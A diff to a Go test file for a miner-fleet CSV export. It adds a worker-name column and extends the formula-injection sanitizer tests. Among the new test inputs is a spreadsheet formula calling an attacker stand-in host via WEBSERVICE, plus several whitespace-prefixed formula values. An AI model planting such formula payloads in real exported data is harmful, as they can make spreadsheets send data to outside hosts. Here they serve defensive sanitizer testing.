@@ -18,6 +18,7 @@ func TestBuildMinerCSVRow_FormatsValuesAndIssues(t *testing.T) {
 	row := buildMinerCSVRow(
 		&pb.MinerStateSnapshot{
 			Name:            "Miner A",
+			WorkerName:      "worker-01",
 			GroupLabels:     []string{"Group 1", "Group 2"},
 			RackLabel:       "Rack 1",
 			Model:           "S21",
@@ -57,6 +58,7 @@ func TestBuildMinerCSVRow_FormatsValuesAndIssues(t *testing.T) {
 
 	assert.Equal(t, []string{
 		"Miner A",
+		"worker-01",
 		"Group 1, Group 2",
 		"Rack 1",
 		"S21",
@@ -82,7 +84,7 @@ func TestBuildMinerCSVRow_EmptyRackLabel(t *testing.T) {
 		pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_CELSIUS,
 	)
 
-	assert.Equal(t, "", row[2], "rack column should be empty when no rack is assigned")
+	assert.Equal(t, "", row[3], "rack column should be empty when no rack is assigned")
 }
 
 func TestBuildMinerCSVRow_MissingMetadataUsesDashPlaceholder(t *testing.T) {
@@ -95,15 +97,16 @@ func TestBuildMinerCSVRow_MissingMetadataUsesDashPlaceholder(t *testing.T) {
 		pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_CELSIUS,
 	)
 
-	assert.Equal(t, "-", row[3], "model should be dash, not '-'")
-	assert.Equal(t, "-", row[4], "MAC should be dash, not '-'")
-	assert.Equal(t, "-", row[5], "IP should be dash, not '-'")
-	assert.Equal(t, "-", row[12], "firmware should be dash, not '-'")
+	assert.Equal(t, "-", row[4], "model should be dash, not '-'")
+	assert.Equal(t, "-", row[5], "MAC should be dash, not '-'")
+	assert.Equal(t, "-", row[6], "IP should be dash, not '-'")
+	assert.Equal(t, "-", row[13], "firmware should be dash, not '-'")
 }
 
 func TestBuildExportHeaders_UsesTemperatureUnit(t *testing.T) {
 	assert.Equal(t, []string{
 		"Name",
+		"Worker Name",
 		"Groups",
 		"Rack",
 		"Model",
@@ -120,6 +123,7 @@ func TestBuildExportHeaders_UsesTemperatureUnit(t *testing.T) {
 
 	assert.Equal(t, []string{
 		"Name",
+		"Worker Name",
 		"Groups",
 		"Rack",
 		"Model",
@@ -318,6 +322,10 @@ func TestSanitizeCSVField(t *testing.T) {
 		{"@SUM(A1)", "'@SUM(A1)"},
 		{"\tcmd", "'\tcmd"},
 		{"\rcmd", "'\rcmd"},
+		{"\ncmd", "'\ncmd"},
+		{" =1+1", "' =1+1"},
+		{"\n=WEBSERVICE(\"https://attacker.invalid\")", "'\n=WEBSERVICE(\"https://attacker.invalid\")"},
+		{"\t@SUM(A1)", "'\t@SUM(A1)"},
 		{"Miner A", "Miner A"},
 		{"192.168.1.1", "192.168.1.1"},
 	}
